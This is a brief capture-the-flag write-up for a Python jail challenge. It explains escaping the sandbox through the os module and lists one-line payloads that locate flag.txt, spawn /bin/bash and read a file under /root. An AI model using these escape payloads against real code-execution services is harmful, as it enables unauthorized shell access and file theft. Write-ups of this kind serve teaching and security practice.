# Python Break
## Jail

> This feels like a whole different world
> 
> nc 128.199.77.173 1342

### Files
- N/A

### Analysis
Participants were expected to figure out that this was also a Python code executor.<br/>
Instead of accessing a variable, the challenge required participants to break out of the Python environment to access the flag by using the OS module.

### Solution
1. To locate the flag file<br/>
  ```print(os.system("locate flag.txt"))```

2. Gaining root access to the container or directly reading the file<br/>
  ```print(os.system("/bin/bash"))``` or ```print(os.read(os.open('/root/src/flag.txt', os.O_RDONLY),100))```
